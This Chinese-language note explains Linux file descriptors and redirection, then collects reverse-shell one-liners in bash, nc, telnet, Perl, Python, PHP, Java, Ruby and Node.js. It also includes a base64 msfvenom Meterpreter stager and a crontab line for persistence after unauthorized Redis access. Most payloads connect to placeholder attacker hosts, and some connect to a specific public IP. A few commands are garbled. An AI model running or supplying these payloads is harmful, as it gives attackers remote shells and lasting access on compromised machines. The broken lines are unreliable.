# 反弹shell



## linux反弹shell的原理

### 文件描述符与重定向

参考链接:https://xz.aliyun.com/t/2548

#### 文件描述符是什么

wiki:**文件描述符**（File descriptor,即:fd）是计算机科学中的一个术语，是一个用于表述**指向[文件](https://zh.wikipedia.org/wiki/文件)的引用**的抽象化概念。



| fd | 名称 |
| ---- | ---- |
|   0   | 标准输入 |
| 1 | 标准输出 |
| 2 | 标准错误输出 |

当Linux启动的时候会默认打开三个文件描述符，分别是：

标准输入:standard input 0 （默认设备键盘）
标准输出:standard output 1（默认设备显示器）
错误输出：error output 2（默认设备显示器）

##### **注意：**

（1）以后再打开文件，描述符可以依次增加
（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符

#### 重定向

既然文件描述符是一个文件的引用

那么默认情况下0,1,2都引用了什么文件,在Linux下一切皆文件,所以这些文件也代表着设备

| fd   | 文件                | 文件代表的设备 |
| ---- | ------------------- | ----|
| 0    | /dev/input/keyboard | 键盘 |
| 1    | /dev/fb |  显示屏|
| 2    | /dev/fb | 显示屏|

既然是引用，那就说明我们可以修改引用



##### 输出重定向

[fd]> file ([fd]和>之间没有空格,而>和file 之间有空格),如果[fd]为空,默认为1

执行过程:先判断file是否存在,若存在则删除,然后创建file ,再将[fd]重定向到file,以写的方式打开

即[fd]将指向file

[fd]>> file 以追加的方式打开 file

##### 输入重定向

[fd]< file ([fd]和<之间没有空格,而<和file 之间有空格),如果[fd]为空,默认为0

执行过程:将[fd]重定向到file,以读的方式打开,若不存在则报错,即[fd]将指向file



##### 标准输入和标准错误输出重定向

```sh
&>word 与 >&word 相同(没有空格哦)
等价于 2> word 1>&2
```

标准输入和标准错误输出重定向到word上



##### &的使用

1. &[n] 代表[n]说引用的文件(特别像c++里的引用)

2. 文件描述符的复制
   [n]>&[m]或[n]<&[m] (没用空格)，这两个的意思都是将[n]重定向到[m]引用的文件上,

   至于为啥,我也不懂,我把它看成了固定格式

3. &> 和<& 标准输入和标准错误输出重定向

##### **exec 绑定重定向**

格式：exec [n] </> file/[n]

上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令

##### 重点

1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令

2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）

3.输入输出重定向的差异是打开文件的方式不同,不要被他们的名字迷惑.否则后面看别人写的会一脸懵逼，如

```shell
bash -i &> /dev/tcp/10.0.0.10/23333 0<&1
和
bash -i &> /dev/tcp/10.0.0.10/23333 0>&1
```

4.重定向的左边一定是[fd]

### 反弹shell的原理

```shell
bash -i &> /dev/tcp/10.0.0.10/23333 0<&1
```

1. bash -i

打开一个交互的bash

2. &> /dev/tcp/10.0.0.10/23333

在linux下一切皆文件,实际访问/dev/tcp/10.0.0.10/23333，其实是不存在的

而向/dev/tcp/10.0.0.10/23333发送信息,实际上会发信息给10.0.0.10的23333端口



## 反弹shell脚本总结

### 0x01 bash 版本：

```
bash -i >& /dev/tcp/attackerip/1234 0>&1
```

注意这个是由解析 shell 的 bash 完成，所以某些情况下不支持。我用 zsh 不能反弹。这个也是最常用的。

### 0x02 nc 版本：

支持 - e 选项

```
nc -e /bin/sh attackerip 1234
```

这个方式最简单
不能使用 - e 选项时：

```
mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe/bin/sh | nc attackerip 4444 rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
```

安装的 NC 版本有问题时：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip 1234 >/tmp/f
```

### 0x03 Telnet 版本：(nc 不可用或 / dev/tcp 不可用时)

```
mknod backpipe p && telnet attackerip 8080 0<backpipe | /bin/bash 1>backpipe
```

### 0x04 Perl 版本：

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

不依赖于 / bin/sh 的 shell： *** 这条语句比上面的更为简短，而且确实不需要依赖 / bin/sh

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 0x05 Python 版本：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.108.164.219",60003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

另外的形式：

```
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

另外 Metasploit 版的代码：

```
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))
```

### 0x06 php 版本：

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'



```

```
$sock = fsockopen("39.108.164.219", "60007");
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock,
        3 => $sock
);
$process = proc_open('/bin/bash', $descriptorspec, $pipes);
proc_close($process);
```



### 0x07 java 版本：

```
r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```

### 0x08 ruby 版本：

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

不依赖于 / bin/sh 的 shell：

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend'
```

如果目标系统运行 Windows：

```
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend'
```

### 0x09 crontab 定时任务：

这也是在 redis 未授权访问的时候使用过的。
crontab -e 编辑当前用户的任务，或者是写到计划任务目录，一般是 / var/spool/cron / 目录，ubuntu 是 / var/spool/cron/crontabs。文件名为用户名 root 等。下面命令含义是每一分钟执行一次反弹 shell 命令。具体 crontab 用法可以参考 [Crontab 定时任务配置](http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html)



```
* * * * *  -i >& /dev/tcp/attackerip/1234 0>&1
```

最后其实发现，虽然形式不同，但是其实都是基于 / bin/bash 和 / bin/sh



### nodejs

```
global.process.mainModule.constructor._load('child_process').exec('nc vps-ip port -e /bin/sh',function(){});
```





### 0x10 参考

http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html